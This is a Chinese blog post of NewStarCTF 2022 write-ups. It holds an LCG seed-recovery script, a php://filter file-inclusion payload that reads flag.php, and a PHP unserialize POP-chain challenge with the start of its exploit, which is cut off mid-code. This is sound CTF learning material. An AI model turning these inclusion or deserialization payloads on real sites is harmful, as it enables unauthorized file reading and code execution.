<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>newstar2022 - mof's Blog</title><meta name=Description content="这是mof的博客"><meta property="og:title" content="newstar2022"><meta property="og:description" content="week1 misc mmsstv crypto rsa 维纳攻击 week2 misc 奇怪的波形 侧信道 看两个波形差距 奇怪的二维码 二维码（Aztec Code 在线生成条形码 (aspose.app) crypto ezRabin rabin加密时e为2，本题目e为4"><meta property="og:type" content="article"><meta property="og:url" content="https://githubmof.github.io/newstar2022/"><meta property="og:image" content="https://githubmof.github.io/images/w.ico"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-07-12T16:20:20+08:00"><meta property="article:modified_time" content="2023-09-10T03:35:11+00:00"><meta property="og:site_name" content="My cool site"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://githubmof.github.io/images/w.ico"><meta name=twitter:title content="newstar2022"><meta name=twitter:description content="week1 misc mmsstv crypto rsa 维纳攻击 week2 misc 奇怪的波形 侧信道 看两个波形差距 奇怪的二维码 二维码（Aztec Code 在线生成条形码 (aspose.app) crypto ezRabin rabin加密时e为2，本题目e为4"><meta name=application-name content="LoveIt"><meta name=apple-mobile-web-app-title content="LoveIt"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/images/w.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://githubmof.github.io/newstar2022/><link rel=prev href=https://githubmof.github.io/%E5%B0%8F%E6%B8%B8%E6%88%8F/><link rel=next href=https://githubmof.github.io/mtctf2022/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"newstar2022","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/githubmof.github.io\/newstar2022\/"},"genre":"posts","keywords":"ctf","wordcount":6485,"url":"https:\/\/githubmof.github.io\/newstar2022\/","datePublished":"2023-07-12T16:20:20+08:00","dateModified":"2023-09-10T03:35:11+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"mof"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><a href=https://github.com/githubmof class=github-corner target=_blank title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="3.5rem" height="3.5rem" viewBox="0 0 250 250" style="fill:#70b7fd;color:#fff;position:absolute;top:0;border:0;left:0;transform:scale(-1,1)" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg></a><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章
</a><a class=menu-item href=/tags/>标签
</a><a class=menu-item href=/categories/>分类</a><div class=dropdown><a href=javascript:void(0); class="menu-item menu-more dropbtn" title>游戏</a><div class="menu-more-content dropdown-content"><a href=/game/mikutap/ title target=_blank rel=noopener>mikutap </a><a href=/game/catch-the-cat/ title target=_blank rel=noopener>逮住那只猫!</a></div></div><a class=menu-item href=/about/>关于
</a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="mof's Blog">mof's Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/ title>游戏</a><a class=menu-item href=/about/ title>关于</a><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题>
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">newstar2022</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://github.com/githubmof title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>mof</a></span>&nbsp;<span class=post-category>收录于 <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>ctf</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-07-12>2023-07-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;约 6485 字&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;预计阅读 13 分钟&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#week1>week1</a><ul><li><a href=#misc>misc</a></li><li><a href=#crypto>crypto</a></li></ul></li><li><a href=#week2>week2</a><ul><li><a href=#misc-1>misc</a></li><li><a href=#crypto-1>crypto</a></li><li><a href=#web>web</a></li></ul></li><li><a href=#week3>week3</a><ul><li><a href=#web-1>web</a></li><li><a href=#crpto>crpto</a></li></ul></li><li><a href=#week4>week4</a><ul><li><a href=#web-2>web</a></li><li><a href=#crypto-2>crypto</a></li></ul></li><li><a href=#week5>week5</a><ul><li><a href=#web-3>web</a></li><li><a href=#crypto-3>crypto</a></li></ul></li></ul></nav></div></div><div class=content id=content><h2 id=week1>week1</h2><h3 id=misc>misc</h3><p>mmsstv</p><h3 id=crypto>crypto</h3><p>rsa 维纳攻击</p><h2 id=week2>week2</h2><h3 id=misc-1>misc</h3><h4 id=奇怪的波形>奇怪的波形</h4><p>侧信道</p><p>看两个波形差距</p><h4 id=奇怪的二维码>奇怪的二维码</h4><p>二维码（Aztec Code</p><p><a href=https://products.aspose.app/barcode/zh-hans/generate target=_blank rel="noopener noreffer">在线生成条形码 (aspose.app)</a></p><h3 id=crypto-1>crypto</h3><h4 id=ezrabin>ezRabin</h4><p>rabin加密时e为2，本题目e为4，一次解密得到的是m^2 mod n，再解密一次就能得到m</p><p><a href=https://blog.csdn.net/jcbx_/article/details/101066670 target=_blank rel="noopener noreffer">RSA攻击之Rabin密码体制_Gm1y的博客-CSDN博客_rabin密码</a></p><h4 id=ezprng>ezPRNG</h4><p>task.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;xxxxxxxxxxxxxxxxxxxx&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>my_prng_lcg</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>seed</span><span class=p>,</span> <span class=n>multiplier</span><span class=p>,</span> <span class=n>increment</span><span class=p>,</span> <span class=n>modulus</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>=</span> <span class=n>seed</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>multiplier</span> <span class=o>=</span> <span class=n>multiplier</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>increment</span> <span class=o>=</span> <span class=n>increment</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>modulus</span> <span class=o>=</span> <span class=n>modulus</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>random</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>*</span> <span class=bp>self</span><span class=o>.</span><span class=n>multiplier</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>increment</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>modulus</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>state</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PRNG</span> <span class=o>=</span> <span class=n>my_prng_lcg</span><span class=p>(</span><span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>),</span> <span class=n>getRandomInteger</span><span class=p>(</span><span class=mi>256</span><span class=p>),</span> <span class=n>getRandomInteger</span><span class=p>(</span><span class=mi>256</span><span class=p>),</span> <span class=n>getRandomInteger</span><span class=p>(</span><span class=mi>256</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>gift</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>gift</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>PRNG</span><span class=o>.</span><span class=n>random</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>qwq</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>qwq</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>gift</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># [32579077549265101609729134002322479188058664203229584246639330306875565342934, </span>
</span></span><span class=line><span class=cl><span class=c1># 30627296760863751873213598737521260410801961411772904859782399797798775242121, </span>
</span></span><span class=line><span class=cl><span class=c1># 59045755507520598673072877669036271379314362490837080079400207813316110037822, </span>
</span></span><span class=line><span class=cl><span class=c1># 29714794521560972198312794885289362350476307292503308718904661896314434077717, </span>
</span></span><span class=line><span class=cl><span class=c1># 3378007627369454232183998646610752441039379051735310926898417029172995488622, </span>
</span></span><span class=line><span class=cl><span class=c1># 35893579613746468714922176435597562302206699188445795487657524606666534642489]</span>
</span></span></code></pre></div><p><a href=https://www.codercto.com/a/35743.html target=_blank rel="noopener noreffer">https://www.codercto.com/a/35743.html</a></p><p><a href=https://we.buptmerak.cn/archives/210 target=_blank rel="noopener noreffer">Crypto学习笔记 – 天璇Merak (buptmerak.cn)</a></p><p><a href=https://blog.csdn.net/hacker_zrq/article/details/120891641 target=_blank rel="noopener noreffer">PRNG伪随机数的破解方法_OnlyForBetter的博客-CSDN博客_prng</a></p><p>exp.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>functools</span> <span class=kn>import</span> <span class=n>reduce</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gmpy2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># states至少3</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_unkown_N0</span><span class=p>(</span><span class=n>states</span><span class=p>,</span><span class=n>moudulus</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=p>((</span><span class=n>states</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>*</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=n>states</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>moudulus</span><span class=p>))</span><span class=o>%</span><span class=n>moudulus</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span><span class=o>=</span><span class=p>(</span><span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=p>(</span><span class=n>a</span><span class=o>*</span><span class=n>states</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span><span class=o>%</span><span class=n>moudulus</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(((</span><span class=n>states</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>b</span><span class=p>))</span><span class=o>*</span><span class=n>gmpy2</span><span class=o>.</span><span class=n>invert</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>n</span><span class=p>)</span><span class=o>+</span><span class=n>n</span><span class=p>)</span><span class=o>%</span><span class=n>moudulus</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_unknown_increment</span><span class=p>(</span><span class=n>states</span><span class=p>,</span> <span class=n>modulus</span><span class=p>,</span> <span class=n>multiplier</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>    <span class=n>increment</span> <span class=o>=</span> <span class=p>(</span><span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>states</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>multiplier</span><span class=p>)</span> <span class=o>%</span> <span class=n>modulus</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>modulus</span><span class=p>,</span> <span class=n>multiplier</span><span class=p>,</span> <span class=n>increment</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_unknown_multiplier</span><span class=p>(</span><span class=n>states</span><span class=p>,</span> <span class=n>modulus</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>multiplier</span> <span class=o>=</span> <span class=p>(</span><span class=n>states</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>-</span> <span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span> <span class=o>*</span> <span class=n>inverse</span><span class=p>(</span><span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>states</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=n>modulus</span><span class=p>)</span> <span class=o>%</span> <span class=n>modulus</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crack_unknown_increment</span><span class=p>(</span><span class=n>states</span><span class=p>,</span> <span class=n>modulus</span><span class=p>,</span> <span class=n>multiplier</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># states至少6</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_unknown_modulus</span><span class=p>(</span><span class=n>states</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>    <span class=n>diffs</span> <span class=o>=</span> <span class=p>[</span><span class=n>s1</span> <span class=o>-</span> <span class=n>s0</span> <span class=k>for</span> <span class=n>s0</span><span class=p>,</span> <span class=n>s1</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>states</span><span class=p>,</span> <span class=n>states</span><span class=p>[</span><span class=mi>1</span><span class=p>:])]</span> 
</span></span><span class=line><span class=cl>    <span class=n>zeroes</span> <span class=o>=</span> <span class=p>[</span><span class=n>t2</span><span class=o>*</span><span class=n>t0</span> <span class=o>-</span> <span class=n>t1</span><span class=o>*</span><span class=n>t1</span> <span class=k>for</span> <span class=n>t0</span><span class=p>,</span> <span class=n>t1</span><span class=p>,</span> <span class=n>t2</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>diffs</span><span class=p>,</span> <span class=n>diffs</span><span class=p>[</span><span class=mi>1</span><span class=p>:],</span> <span class=n>diffs</span><span class=p>[</span><span class=mi>2</span><span class=p>:])]</span> 
</span></span><span class=line><span class=cl>    <span class=n>modulus</span> <span class=o>=</span> <span class=nb>abs</span><span class=p>(</span><span class=n>reduce</span><span class=p>(</span><span class=n>GCD</span><span class=p>,</span> <span class=n>zeroes</span><span class=p>))</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>crack_unknown_multiplier</span><span class=p>(</span><span class=n>states</span><span class=p>,</span> <span class=n>modulus</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[</span><span class=mi>32579077549265101609729134002322479188058664203229584246639330306875565342934</span><span class=p>,</span><span class=mi>30627296760863751873213598737521260410801961411772904859782399797798775242121</span><span class=p>,</span><span class=mi>59045755507520598673072877669036271379314362490837080079400207813316110037822</span><span class=p>,</span><span class=mi>29714794521560972198312794885289362350476307292503308718904661896314434077717</span><span class=p>,</span><span class=mi>3378007627369454232183998646610752441039379051735310926898417029172995488622</span><span class=p>,</span><span class=mi>35893579613746468714922176435597562302206699188445795487657524606666534642489</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>n</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>b</span> <span class=o>=</span> <span class=n>crack_unknown_modulus</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=n>crack_unkown_N0</span><span class=p>(</span><span class=n>data</span><span class=p>,</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></div><h3 id=web>web</h3><h4 id=includeone>IncludeOne</h4><p>php伪随机数</p><p><a href=https://www.openwall.com/php_mt_seed/ target=_blank rel="noopener noreffer">php_mt_seed - PHP mt_rand() seed cracker (openwall.com)</a></p><p>php伪协议（rot13</p><p>payload</p><pre tabindex=0><code>?file=php://filter/read=string.rot13/NewStar/resource=./flag.php
guess=1202031004
</code></pre><p>题目要求有NewStar/，在伪协议这个地方添加不会影响读取</p><h4 id=unserializeone>UnserializeOne</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>#Something useful for you : https://zhuanlan.zhihu.com/p/377676274
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>class</span> <span class=nc>Start</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;Welcome to NewStarCTF, &#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__isset</span><span class=p>(</span><span class=nv>$var</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Sec</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span><span class=o>-&gt;</span><span class=na>check</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;CTFers&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Easy</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cla</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$fun</span><span class=p>,</span> <span class=nv>$var</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cla</span> <span class=o>=</span> <span class=k>clone</span> <span class=nv>$var</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>eeee</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__clone</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;success&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pop&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;pop&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://zhuanlan.zhihu.com/p/377676274 target=_blank rel="noopener noreffer">PHP反序列化研究 - 知乎 (zhihu.com)</a></p><p>（序列化保存对象成员值，自定义函数不会保存</p><p>exp.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Start</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>protected</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$name</span><span class=p>,</span><span class=nv>$func</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span> <span class=o>=</span> <span class=nv>$name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span> <span class=o>=</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Sec</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$obj</span><span class=p>,</span> <span class=nv>$var</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span> <span class=o>=</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span> <span class=o>=</span> <span class=nv>$var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
